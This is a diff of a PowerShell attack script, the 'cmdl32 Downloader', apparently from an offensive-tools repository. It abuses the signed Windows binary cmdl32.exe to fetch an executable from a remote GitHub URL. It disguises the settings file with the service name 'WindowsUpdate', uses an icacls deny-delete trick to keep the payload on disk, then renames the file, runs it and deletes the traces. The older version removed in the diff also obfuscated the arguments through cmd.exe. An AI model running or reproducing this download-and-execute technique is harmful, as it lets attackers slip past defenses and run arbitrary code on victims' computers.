@@ -1,54 +1,33 @@
 Write-Host "[-] cmdl32 Downloader - liquidsky ^_~"
-
+# Thanks to Elliot Killick (@elliotkillick) for the discovery of the lolbin
 # Create a temp directory to work in
 $tempDir = Join-Path -Path $env:TEMP -ChildPath "cmdl32_temp"
 New-Item -Path $tempDir -ItemType Directory -Force
-
 # Change to the temp directory
 Set-Location -Path $tempDir
-Write-Host "[*] Working directory changed to ${tempDir}"
-
+Write-Host "[*] Working directory changed to $tempDir"
 Write-Host "[*] Denying delete permissions for current user"
 # Deny delete permissions in the temp directory for the current user
 icacls $tempDir /deny "$($env:USERNAME):(OI)(CI)(DE,DC)"
-
 Write-Host "[*] Setting temp environment variable"
 # Set the TMP environment variable to the temp directory
 $env:TMP = $tempDir
-
 Write-Host "[*] Creating VPN settings file"
-# Define settings file content
 $settingsContent = @"
 [Connection Manager]
-CMSFile=.config
+CMSFile=settings.txt
 ServiceName=WindowsUpdate
-TunnelFile=.config
+TunnelFile=settings.txt
 [Settings]
 UpdateUrl=https://raw.githubusercontent.com/fuzzlove/h4v0k/main/whois.exe
 "@
-Set-Content -Path "$tempDir\.config" -Value $settingsContent
-
-Write-Host "[*] Performing download with cmdl32 via cmd.exe"
-
-# Directly reference cmdl32 from System32
-$cmdl32Path = "C:\Windows\System32\cmdl32.exe"
-
-# Check if cmdl32 exists
-if (!(Test-Path -Path $cmdl32Path)) {
-    Write-Host "[!] cmdl32.exe not found in System32, cannot proceed."
-    Exit
-}
-
-Write-Host "[*] Using cmdl32.exe at: $cmdl32Path"
-
-# Define the arguments with obfuscation using quotes within the command
-$arguments = "/c $cmdl32Path /vpn `"$tempDir\.config`""
-
-Write-Host "[*] Starting cmd.exe with obfuscated arguments: $arguments"
-
-# Start cmd.exe to execute cmdl32
+Set-Content -Path "$tempDir\settings.txt" -Value $settingsContent
+Write-Host "[*] Performing download with cmdl32"
+# Assuming cmdl32 is in system32 or accessible
+$cmdl32Path = "cmdl32"
+$arguments = "/vpn /lan `"$tempDir\settings.txt`""
 try {
-    Start-Process -FilePath "cmd.exe" -ArgumentList $arguments -NoNewWindow -Wait
+    Start-Process -FilePath $cmdl32Path -ArgumentList $arguments -NoNewWindow -Wait
     Write-Host "[*] Download complete with cmdl32."
 } catch {
     Write-Host "[!] cmdl32 failed: $($_.Exception.Message)"
@@ -56,22 +35,14 @@ try {
     icacls $tempDir /remove:d "$env:USERNAME"
     Exit
 }
-
 Write-Host "[*] Reverting permissions"
 icacls $tempDir /remove:d "$env:USERNAME"
-
-# Debugging: List all files in the temp directory to check if the download succeeded
-Write-Host "[*] Listing files in ${tempDir}:"
-Get-ChildItem -Path $tempDir
-
 Write-Host "[*] Renaming downloaded file for execution"
-# Try to find any downloaded file, not just .tmp
-$downloadedFile = Get-ChildItem -Path $tempDir | Where-Object { $_.Name -match "VPN.*" } | Select-Object -First 1
-
+$downloadedFile = Get-ChildItem -Path $tempDir -Filter "VPN*.tmp" | Select-Object -First 1
 if ($downloadedFile) {
     Write-Host "[*] Downloaded file found: $($downloadedFile.FullName)"
     
-    # Construct the target path for renaming the file
+    # Construct the target path for the rename
     $targetPath = Join-Path -Path $tempDir -ChildPath "whois.exe"
     
     # Debug output: Check the target path
@@ -86,21 +57,20 @@ if ($downloadedFile) {
         Exit
     }
 } else {
-    Write-Host "[!] No downloaded file found matching 'VPN*'. Exiting script."
+    Write-Host "[!] No downloaded file found matching 'VPN*.tmp'. Exiting script."
     Exit
 }
-
 Write-Host "[*] Executing the downloaded file"
 if (Test-Path "$tempDir\whois.exe") {
-    Write-Host "[*] Executing the file $tempDir\whois.exe"
     Start-Process -FilePath "$tempDir\whois.exe" -NoNewWindow -Wait
     Write-Host "[*] Execution complete."
 } else {
     Write-Host "[!] whois.exe not found after renaming. Exiting script."
     Exit
 }
-
 Write-Host "[*] Cleaning up downloaded file"
 Remove-Item -Path "$tempDir\whois.exe" -Force
-Remove-Item -Path "$tempDir\.config" -Force
+Remove-Item -Path "$tempDir\settings.txt" -Force
 Write-Host "[*] Script complete."
+
+From <https://raw.githubusercontent.com/fuzzlove/h4v0k/refs/heads/main/cmdl32dlr.ps1> 
